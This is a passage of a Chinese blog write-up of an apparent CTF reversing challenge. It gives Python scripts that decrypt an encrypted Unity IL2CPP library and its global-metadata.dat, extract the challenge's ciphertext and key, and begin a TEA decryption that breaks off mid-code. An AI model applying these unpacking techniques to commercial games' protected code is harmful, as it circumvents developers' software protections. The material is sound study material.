class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_nihaounity</span>(<span class="hljs-params">data, key=<span class="hljs-string">b&quot;nihaounity&quot;</span></span>):<br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br><br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    out = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i], S[j] = S[j], S[i]<br>        K = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        out.append(byte ^ K ^ <span class="hljs-number">0x33</span>)  <br>    <span class="hljs-keyword">return</span> out<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Usage: <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> &lt;input_il2cpp.so&gt; &lt;output_dec.so&gt;&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    input_file = sys.argv[<span class="hljs-number">1</span>]<br>    output_file = sys.argv[<span class="hljs-number">2</span>]<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br><br>    decrypted = rc4_nihaounity(data)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(decrypted)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Decrypted to <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>以上脚本解密之后得到decil2cpp.so，下一步按理说就是解包global-metadata.dat，看看加载decil2cpp.so能不能发现什么</p><p>定位到sub_211B8C函数，这里尝试优先加载 <code>game.dat</code>，失败则 fallback 到 <code>global-metadata.dat</code>，然后调用了sub_211D94函数，也加载了 <code>global-metadata.dat</code>，跟进看他的内容</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202510302039662.png" alt="image-20251030001910616"></p><hr><p><code>global-metadata.dat</code> 是 Unity IL2CPP 编译时生成的二进制元数据文件。</p><p>它包含了所有 C# 类型、方法、字段、字符串的定义信息。</p><p>运行时必须加载它才能支持反射、序列化、跨语言调用等功能。</p><hr><p>这个函数载入了metadata，在这里找找看加解密逻辑</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202510302054462.png" alt="image-20251030205447395"></p><p>定位到sub_21A2C8函数，这个函数是对global-metadata.dat 数据进行解密。</p><p>解密脚本还原global-metadata.dat</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Tuple</span>, <span class="hljs-type">Optional</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MetadataDecryptor</span>:<br><br>    HEADER_SIZE = <span class="hljs-number">1024</span>  <span class="hljs-comment"># 前 1024 字节为明文头部</span><br>    KEY_OFFSET = <span class="hljs-number">1028</span>   <span class="hljs-comment"># 密钥起始偏移（src[514] * 2）</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, data: <span class="hljs-built_in">bytes</span></span>):<br>        <span class="hljs-variable language_">self</span>.data = data<br>        <span class="hljs-variable language_">self</span>.data_len = <span class="hljs-built_in">len</span>(data)<br>        <span class="hljs-variable language_">self</span>.v2: <span class="hljs-type">Optional</span>[<span class="hljs-built_in">int</span>] = <span class="hljs-literal">None</span>  <span class="hljs-comment"># 密钥数量（src[512]）</span><br>        <span class="hljs-variable language_">self</span>.key_count = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.key_stream_offset = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.cipher_offset = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.plaintext_size = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_read_v2</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-string">&quot;&quot;&quot;从偏移 1024 处读取 v2（uint16）&quot;&quot;&quot;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.data_len &lt; <span class="hljs-number">1026</span>:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;文件太短，无法读取 v2（偏移 1024）&quot;</span>)<br>        <span class="hljs-keyword">return</span> struct.unpack(<span class="hljs-string">&#x27;&lt;H&#x27;</span>, <span class="hljs-variable language_">self</span>.data[<span class="hljs-number">1024</span>:<span class="hljs-number">1026</span>])[<span class="hljs-number">0</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_setup_layout</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;计算文件布局&quot;&quot;&quot;</span><br>        <span class="hljs-variable language_">self</span>.v2 = <span class="hljs-variable language_">self</span>._read_v2()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 检测到密钥数量 v2 = <span class="hljs-subst">&#123;self.v2&#125;</span>&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.key_count = <span class="hljs-variable language_">self</span>.v2<br>        <span class="hljs-variable language_">self</span>.key_stream_offset = <span class="hljs-variable language_">self</span>.KEY_OFFSET<br>        <span class="hljs-variable language_">self</span>.cipher_offset = <span class="hljs-variable language_">self</span>.KEY_OFFSET + <span class="hljs-number">4</span> * <span class="hljs-variable language_">self</span>.v2<br><br>        encrypted_part_length = <span class="hljs-variable language_">self</span>.data_len - <span class="hljs-variable language_">self</span>.cipher_offset<br>        <span class="hljs-keyword">if</span> encrypted_part_length &lt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;加密数据起始偏移超出文件范围&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.plaintext_size = <span class="hljs-variable language_">self</span>.HEADER_SIZE + encrypted_part_length<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_validate_offsets</span>(<span class="hljs-params">self, cipher_idx: <span class="hljs-built_in">int</span>, key_idx: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>        cipher_off = <span class="hljs-variable language_">self</span>.cipher_offset + cipher_idx<br>        key_off = <span class="hljs-variable language_">self</span>.key_stream_offset + key_idx * <span class="hljs-number">4</span><br>        <span class="hljs-keyword">return</span> (<br>            cipher_off + <span class="hljs-number">4</span> &lt;= <span class="hljs-variable language_">self</span>.data_len <span class="hljs-keyword">and</span><br>            key_off + <span class="hljs-number">4</span> &lt;= <span class="hljs-variable language_">self</span>.data_len<br>        )<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-variable language_">self</span>._setup_layout()<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 输入长度: <span class="hljs-subst">&#123;self.data_len&#125;</span> 字节&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 密钥流偏移: <span class="hljs-subst">&#123;self.key_stream_offset&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 加密数据偏移: <span class="hljs-subst">&#123;self.cipher_offset&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 预期明文长度: <span class="hljs-subst">&#123;self.plaintext_size&#125;</span> 字节&quot;</span>)<br>        decrypted = <span class="hljs-built_in">bytearray</span>(<span class="hljs-variable language_">self</span>.data[:<span class="hljs-variable language_">self</span>.HEADER_SIZE])<br>        decrypted.extend(<span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-variable language_">self</span>.plaintext_size - <span class="hljs-variable language_">self</span>.HEADER_SIZE))<br>        processed = <span class="hljs-number">0</span><br>        chunk_size = <span class="hljs-number">4</span><br><br>        <span class="hljs-keyword">while</span> processed &lt; <span class="hljs-variable language_">self</span>.plaintext_size - <span class="hljs-variable language_">self</span>.HEADER_SIZE:<br>            <span class="hljs-comment"># 动态密钥索引：v9 = i + i // v2, 然后取模</span><br>            virtual_idx = processed<br>            key_stream_idx = (virtual_idx + virtual_idx // (<span class="hljs-number">4</span> * <span class="hljs-variable language_">self</span>.v2)) % <span class="hljs-variable language_">self</span>.v2<br><br>            cipher_offset = <span class="hljs-variable language_">self</span>.cipher_offset + processed<br>            key_offset = <span class="hljs-variable language_">self</span>.key_stream_offset + key_stream_idx * <span class="hljs-number">4</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>._validate_offsets(processed, key_stream_idx):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] 跳过越界访问: cipher=<span class="hljs-subst">&#123;cipher_offset&#125;</span>, key=<span class="hljs-subst">&#123;key_offset&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">break</span><br>            cipher_block = struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-variable language_">self</span>.data[cipher_offset:cipher_offset+<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]<br>            key_block   = struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, <span class="hljs-variable language_">self</span>.data[key_offset:key_offset+<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]<br>            plain_block = cipher_block ^ key_block<br><br><br>            struct.pack_into(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, decrypted, <span class="hljs-variable language_">self</span>.HEADER_SIZE + processed, plain_block)<br>            processed += chunk_size<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 解密完成。共处理 <span class="hljs-subst">&#123;processed&#125;</span> 字节数据。输出长度: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(decrypted)&#125;</span> 字节&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(decrypted)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_file</span>(<span class="hljs-params">path: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path):<br>        <span class="hljs-keyword">raise</span> FileNotFoundError(<span class="hljs-string">f&quot;文件不存在: <span class="hljs-subst">&#123;path&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> f.read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_file</span>(<span class="hljs-params">path: <span class="hljs-built_in">str</span>, data: <span class="hljs-built_in">bytes</span></span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 解密成功，文件已保存至: <span class="hljs-subst">&#123;path&#125;</span>&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;用法: <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> &lt;输入加密文件&gt; &lt;输出解密文件&gt;&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;示例: <span class="hljs-subst">&#123;sys.argv[<span class="hljs-number">0</span>]&#125;</span> global-metadata.dat.enc global-metadata.dat&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    input_path, output_path = sys.argv[<span class="hljs-number">1</span>], sys.argv[<span class="hljs-number">2</span>]<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 正在加载文件: <span class="hljs-subst">&#123;input_path&#125;</span>&quot;</span>)<br>        encrypted_data = load_file(input_path)<br><br>        decryptor = MetadataDecryptor(encrypted_data)<br>        decrypted_data = decryptor.decrypt()<br><br>        save_file(output_path, decrypted_data)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] 错误: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>接下来解包得到的global-metadata.dat </p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202510302109646.png" alt="image-20251030210933563"></p><p>在decil2cpp.so附加 ida_py3.py 和 script.json 文件来恢复符号表。</p><p>这里我在比赛的时候做的时候加载的是 Assembly-CSharp.dll，也就是开头说的问题。Assembly-CSharp.dll可以用dnspy看，能看到主要的加密验证函数那些，但是最重要的代码内容还是得着重分析il2cpp文件。</p><p>加载好之后找到flagcheck函数，这里的加密主要是先进行字节转换然后再调用tea加密</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202510302345324.png" alt="image-20251030234534239"></p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202510302354189.png" alt="image-20251030235436132"></p><p>密文密钥是可以通过动调提取的，我没有环境可以调试，看了其他大佬的wp学习一下</p><p>FlagChecker$$.cctor在这里数据会进行初始化，在类加载时，把内嵌的静态数组（key 和密文）初始化成内存中的运行时对象。</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM-o/blog-image@main/image/202510310000432.png" alt="image-20251031000018379"></p><p>这两个符号名是 .NET &#x2F; IL2CPP自动生成的静态数组字段名，key数组是16字节，密文数组是40字节。</p><p>接下来就可以从dump.cs里找到对应密文密钥的偏移量，我直接搜字符串就可以定位</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> &lt;<span class="hljs-title">PrivateImplementationDetails</span>&gt; <span class="hljs-comment">// TypeDefIndex: 2223</span><br>&#123;<br><span class="hljs-comment">// Fields</span><br><span class="hljs-keyword">internal</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">readonly</span> &lt;PrivateImplementationDetails&gt;.__StaticArrayInitTypeSize=<span class="hljs-number">40</span> <span class="hljs-number">29F</span>C2CC7503351583297C73AC477A5D7AA78899F3C0D66E1F909139D4AA1FFB2 <span class="hljs-comment">/*Metadata offset 0xF901D*/</span>; <span class="hljs-comment">// 0x0</span><br><span class="hljs-keyword">internal</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">readonly</span> &lt;PrivateImplementationDetails&gt;.__StaticArrayInitTypeSize=<span class="hljs-number">16</span> C8E4E9E3F34C25560172B0D40B6DF4823260AA87EC6866054AA4691711E5D7BF <span class="hljs-comment">/*Metadata offset 0xF9045*/</span>; <span class="hljs-comment">// 0x28</span><br>&#125;<br></code></pre></td></tr></table></figure><p>确定偏移 是0xF901D 和 0xF9045，然后利用偏移读取global-data.dat 里的密文密钥内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> pathlib <span class="hljs-keyword">import</span> Path<br><br>META_PATH = <span class="hljs-string">&quot;global-metadata-decrypted.dat&quot;</span><br><br>DEFAULTS = &#123;<br>    <span class="hljs-string">&quot;Ciphertext_40&quot;</span>: &#123;<span class="hljs-string">&quot;offset&quot;</span>: <span class="hljs-number">0xF901D</span>, <span class="hljs-string">&quot;size&quot;</span>: <span class="hljs-number">40</span>&#125;,<br>    <span class="hljs-string">&quot;XTEAKey_16&quot;</span>: &#123;<span class="hljs-string">&quot;offset&quot;</span>: <span class="hljs-number">0xF9045</span>, <span class="hljs-string">&quot;size&quot;</span>: <span class="hljs-number">16</span>&#125;,<br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    meta = Path(META_PATH)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> meta.exists():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] metadata file not found: <span class="hljs-subst">&#123;META_PATH&#125;</span>&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    data = meta.read_bytes()<br>    results = &#123;&#125;<br><br>    <span class="hljs-keyword">for</span> name, info <span class="hljs-keyword">in</span> DEFAULTS.items():<br>        off, size = info[<span class="hljs-string">&quot;offset&quot;</span>], info[<span class="hljs-string">&quot;size&quot;</span>]<br>        <span class="hljs-keyword">if</span> off + size &gt; <span class="hljs-built_in">len</span>(data):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] Skipping <span class="hljs-subst">&#123;name&#125;</span>, offset beyond file size&quot;</span>)<br>            <span class="hljs-keyword">continue</span><br>        blob = data[off:off + size]<br>        results[name] = binascii.hexlify(blob).decode().upper()<br><br>    <span class="hljs-keyword">for</span> name, hex_str <span class="hljs-keyword">in</span> results.items():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;name:&lt;<span class="hljs-number">15</span>&#125;</span>: <span class="hljs-subst">&#123;hex_str&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>得到密文密钥：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">Ciphertext_40  : AF5864409DB92167AEB529049E86C543230FBFA6B2AE4AB5C569B7A803D1AECFC62C5B7FA2861E1A<br>XTEAKey_16     : <span class="hljs-number">78563412121110091615141318171615</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tea_decrypt</span>(<span class="hljs-params">v, k</span>):<br>    v0, v1 = v<br>    delta = <span class="hljs-number">0x61C88647</span><br>    sum_ = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        sum_ = (sum_ - delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        sum_ = (sum_ + delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v1 = (v1 - (((v0 &lt;&lt; <span class="hljs-number">4</span>) + k[<span class="hljs-number">2</span>]) ^ (v0 + sum_) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k[<span class="hljs-number">3</span>]))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v0 = (v0 - (((v1 &lt;&lt; <span class="hljs-number">4</span>) + k[<span class="hljs-number">0</span>]) ^ (v1 + sum_) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k[<span class="hljs-number">1</span>]))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> v0, v1<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br><br>    Key = [<span class="hljs-number">0x12345678</span>, <span class="hljs-number">0x09101112</span>, <span class="hljs-number">0x13141516</span>, <span class="hljs-number">0x15161718</span>]<br><br>    enc = <span class="hljs-built_in">bytes</span>([<br>        <span class="hljs-number">0xAF</span>,<span class="hljs-number">0x58</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x40</span>,<span class="hljs-number">0x9D</span>,<span class="hljs-number">0xB9</span>,<span class="hljs-number">0x21</span>,<span class="hljs-number">0x67</span>,<span class="hljs-number">0xAE</span>,<span class="hljs-number">0xB5</span>,<span class="hljs-number">0x29</span>,<span class="hljs-number">0x04</span>,<span class="hljs-number">0x9E</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0xC5</span>,<span class="hljs-number">0x43</span>,<br>        <span class="hljs-number">0x23</span>,<span class="hljs-number">0x0F</span>,<span class="hljs-number">0xBF</span>,<span class="hljs-number">0xA6</span>,<span class="hljs-number">0xB2</span>,<span class="hljs-number">0xAE</span>,<span class="hljs-number">0x4A</span>,<span class="hljs-number">0xB5</span>,<span class="hljs-number">0xC5</span>,<span class="hljs-number">0x69</span>,<span class="hljs-number">0xB7</span>,<span class="hljs-number">0xA8</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0xD1</span>,<span class="hljs-number">0xAE</span>,<span class="hljs-number">0xCF</span>,<br>        <span class="hljs-number">0xC6</span>,<span class="hljs-number">0x2C</span>,<span class="hljs-number">0x5B</span>,<span class="hljs-number">0x7F</span>,<span class="hljs-number">0xA2</span>,<span class="hljs-number">0x86</span>,<span class="hljs-number">0x1E</span>,<span class="hljs-number">0x1A</span><br>    ])<br><br>    cipher = <span class="hljs-built_in">bytearray</span>(enc)<br><br>    p1 = <span class="hljs-number">0</span><br>    p2 = <span class="hljs-number">4</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">2</span>):<br>        p3 = i * <span class="hljs-number">4</span><br>        p4 = i * <span class="hljs-number">4</span> + <span class="hljs-number">4</span><br><br>        v3 = struct.unpack_from(<span class="hljs-string">&quot;&lt;I&quot;</span>, cipher, p3)[<span class="hljs-number">0</span>]<br>        v4 = struct.unpack_from(<span class="hljs-string">&quot;&lt;I&quot;</span>, cipher, p4)[<span class="hljs-number">0</span>]<br>        v1 = struct.unpack_from(<span class="hljs-string">&quot;&lt;I&quot;</span>, cipher, p1)[<span class="hljs-number">0</span>]<br>        v2 = struct.unpack_from(<span class="hljs-string">&quot;&lt;I&quot;</span>, cipher, p2)[<span class="hljs-number">0</span>]<br><br>        v3 ^= v1<br>        v4 ^= v2<br>        struct.pack_into(<span class="hljs-string">&quot;&lt;I&quot;</span>, cipher, p3, v3)<br>        struct.pack_into(<span class="hljs-string">&quot;&lt;I&quot;</span>, cipher, p4, v4)<br><br>        tmp = <span class="hljs-built_in">list</span>(struct.unpack_from(<span class="hljs-string">&quot;&lt;2I&quot;</span>, cipher, <span class="hljs-number">0</span>))<br>        tmp = tea_decrypt(tmp, Key)<br>        struct.pack_into(<span class="hljs-string">&quot;&lt;2I&quot;</span>, cipher, <span class="hljs-number">0</span>, *tmp)<br><br>    tmp = <span 